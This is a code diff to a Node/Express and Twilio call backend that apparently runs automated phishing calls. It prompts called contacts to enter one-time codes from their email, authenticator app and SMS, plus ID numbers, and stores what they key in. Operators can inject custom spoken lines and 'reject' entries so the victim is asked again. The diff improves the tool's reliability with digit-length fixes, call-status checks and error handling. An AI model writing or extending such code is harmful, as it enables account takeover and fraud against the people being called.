@@ -12,36 +12,51 @@ router.post('/request-action/:sessionId', async (req, res) => {
     
     let currentAction = '';
     let actionMessage = '';
+    let numDigits = 20;
     
     switch(action) {
         case 'email_otp':
             currentAction = 'waiting_for_email_otp';
             actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
+            numDigits = 6;
             break;
         case 'auth_otp':
             currentAction = 'waiting_for_auth_otp';
             actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
+            numDigits = 6;
             break;
         case 'phone_otp':
             currentAction = 'waiting_for_phone_otp';
             actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
+            numDigits = 6;
             break;
         case 'id_number':
             currentAction = 'waiting_for_id';
             actionMessage = 'Please enter your ID number followed by the pound key.';
+            numDigits = 20;
             break;
         default:
             return res.status(400).json({ error: 'Invalid action' });
     }
     
     try {
-        // Get the call SID
+        // Get the call SID and check call status first
         const session = await db.query(
-            `SELECT call_sid FROM call_sessions WHERE id = $1`,
+            `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
             [sessionId]
         );
         
         const callSid = session.rows[0]?.call_sid;
+        const callStatus = session.rows[0]?.status;
+        
+        // Check if call is still active
+        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
+            console.log(`Call ${callSid} is not active. Status: ${callStatus}`);
+            return res.status(400).json({ 
+                success: false, 
+                error: `Call is not active. Current status: ${callStatus}` 
+            });
+        }
         
         // Update the session action in database
         await db.query(
@@ -54,9 +69,9 @@ router.post('/request-action/:sessionId', async (req, res) => {
             [sessionId, action]
         );
         
-        // FORCE THE CALL TO LEAVE QUEUE by updating the call with new TwiML
+        // Update the call with new TwiML
         if (callSid) {
-            const twiml = `<Response><Say>${actionMessage}</Say><Gather numDigits="20" action="/webhooks/collect-${action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const twiml = `<Response><Say>${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
             console.log(`Updated call ${callSid} with new TwiML for action: ${action}`);
         }
@@ -66,7 +81,17 @@ router.post('/request-action/:sessionId', async (req, res) => {
         res.json({ success: true, action: action });
     } catch (error) {
         console.error('Error requesting action:', error);
-        res.status(500).json({ error: error.message });
+        
+        // Handle specific Twilio errors
+        if (error.code === 21220) {
+            await db.query(
+                `UPDATE call_sessions SET status = 'failed' WHERE id = $1`,
+                [sessionId]
+            );
+            res.status(400).json({ error: 'Call is no longer active. Please start a new call.' });
+        } else {
+            res.status(500).json({ error: error.message });
+        }
     }
 });
 
@@ -76,13 +101,21 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
     const io = req.app.get('io');
     
     try {
-        // Get the call SID
+        // Get the call SID and check status
         const session = await db.query(
-            `SELECT call_sid FROM call_sessions WHERE id = $1`,
+            `SELECT call_sid, status FROM call_sessions WHERE id = $1`,
             [sessionId]
         );
         
         const callSid = session.rows[0]?.call_sid;
+        const callStatus = session.rows[0]?.status;
+        
+        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
+            return res.status(400).json({ 
+                success: false, 
+                error: `Call is not active. Current status: ${callStatus}` 
+            });
+        }
         
         await db.query(
             `UPDATE call_sessions SET current_action = 'custom_voice', custom_message = $1 WHERE id = $2`,
@@ -94,7 +127,6 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
             [sessionId, 'custom_voice', message]
         );
         
-        // FORCE THE CALL TO LEAVE QUEUE with custom message
         if (callSid) {
             const twiml = `<Response><Say>${message}</Say><Gather numDigits="20" action="/webhooks/collect-custom/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
@@ -106,7 +138,11 @@ router.post('/custom-voice/:sessionId', async (req, res) => {
         res.json({ success: true, message: 'Custom voice command sent' });
     } catch (error) {
         console.error('Error sending custom voice:', error);
-        res.status(500).json({ error: error.message });
+        if (error.code === 21220) {
+            res.status(400).json({ error: 'Call is no longer active. Please start a new call.' });
+        } else {
+            res.status(500).json({ error: error.message });
+        }
     }
 });
 
@@ -116,45 +152,57 @@ router.post('/reject-last-data/:sessionId', async (req, res) => {
     
     try {
         const session = await db.query(
-            `SELECT last_data_type, last_data_value FROM call_sessions WHERE id = $1`,
+            `SELECT last_data_type, last_data_value, call_sid, status FROM call_sessions WHERE id = $1`,
             [sessionId]
         );
         
         const lastDataType = session.rows[0]?.last_data_type;
         const lastDataValue = session.rows[0]?.last_data_value;
+        const callSid = session.rows[0]?.call_sid;
+        const callStatus = session.rows[0]?.status;
         
-        if (lastDataType) {
-            await db.query(
-                `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
-                [sessionId]
-            );
-            
-            await db.query(
-                `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
-                [`waiting_for_${lastDataType}`, sessionId]
-            );
-            
-            // Get call SID and force update
-            const callResult = await db.query(`SELECT call_sid FROM call_sessions WHERE id = $1`, [sessionId]);
-            const callSid = callResult.rows[0]?.call_sid;
-            
-            if (callSid) {
-                let actionMessage = '';
-                if (lastDataType === 'id_number') actionMessage = 'Please enter your ID number followed by the pound key.';
-                else if (lastDataType === 'email_otp') actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
-                else if (lastDataType === 'auth_otp') actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
-                else if (lastDataType === 'phone_otp') actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
-                
-                const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="20" action="/webhooks/collect-${lastDataType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
-                await client.calls(callSid).update({ twiml: twiml });
-            }
-            
-            io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
-            
-            res.json({ success: true, message: `Last ${lastDataType} rejected` });
-        } else {
-            res.json({ success: false, message: 'No data to reject' });
+        if (!lastDataType) {
+            return res.json({ success: false, message: 'No data to reject' });
         }
+        
+        if (callStatus !== 'in-progress' && callStatus !== 'ringing') {
+            return res.json({ success: false, message: 'Call is no longer active' });
+        }
+        
+        await db.query(
+            `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
+            [sessionId]
+        );
+        
+        await db.query(
+            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
+            [`waiting_for_${lastDataType}`, sessionId]
+        );
+        
+        let actionMessage = '';
+        let numDigits = 20;
+        if (lastDataType === 'id_number') {
+            actionMessage = 'Please enter your ID number followed by the pound key.';
+            numDigits = 20;
+        } else if (lastDataType === 'email_otp') {
+            actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
+            numDigits = 6;
+        } else if (lastDataType === 'auth_otp') {
+            actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
+            numDigits = 6;
+        } else if (lastDataType === 'phone_otp') {
+            actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
+            numDigits = 6;
+        }
+        
+        if (callSid) {
+            const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${lastDataType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            await client.calls(callSid).update({ twiml: twiml });
+        }
+        
+        io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
+        
+        res.json({ success: true, message: `Last ${lastDataType} rejected` });
     } catch (error) {
         console.error('Error rejecting data:', error);
         res.status(500).json({ error: error.message });
@@ -180,7 +228,7 @@ router.get('/active-calls', async (req, res) => {
                     c.phone_number, c.full_name
              FROM call_sessions cs
              JOIN contacts c ON cs.contact_id = c.id
-             WHERE cs.status NOT IN ('completed', 'failed')
+             WHERE cs.status IN ('initiated', 'in-progress', 'ringing')
              ORDER BY cs.started_at DESC`
         );
         res.json(result.rows);
